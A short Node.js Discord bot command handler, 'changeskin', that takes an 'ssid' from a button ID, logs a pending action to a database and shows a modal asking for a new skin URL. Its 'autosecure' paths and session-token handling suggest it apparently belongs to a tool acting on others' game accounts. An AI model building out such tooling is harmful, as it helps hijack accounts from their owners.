const axios = require("axios");
const generate = require("../../../autosecure/utils/generate");
const { queryParams } = require("../../../db/database");
const modalBuilder = require("../../../autosecure/utils/modalBuilder");
const { TextInputStyle } = require("discord.js");
let changeskin = {
 name: `changeskin`,
 callback: async (client, interaction) => {
  let id = generate(32)
  let ssid = interaction.customId.split("|")[1]
  queryParams(
   `INSERT INTO actions (id,action) VALUES (?,?)`,
   [id, `skinchangemodal|${ssid}`]
  );
  interaction.showModal(modalBuilder(
   `action|${id}`, `New Skin URL`, [{
    setCustomId: 'newskin',
    setMaxLength: 1000,
    setMinLength: 1,
    setRequired: true,
    setLabel: "Your skin URL",
    setPlaceholder: "https://cdn.discordapp.com/attachments/1465727971829485865/1465729852412924014/IMG_0219.png?ex=698f42cc&is=698df14c&hm=d99767b91ca0c7f738d414409754cfdeb69aceb822d8039e47ac6124ecd0b498",
    setStyle: TextInputStyle.Short
   }]
  ))
 }
}
module.exports = changeskin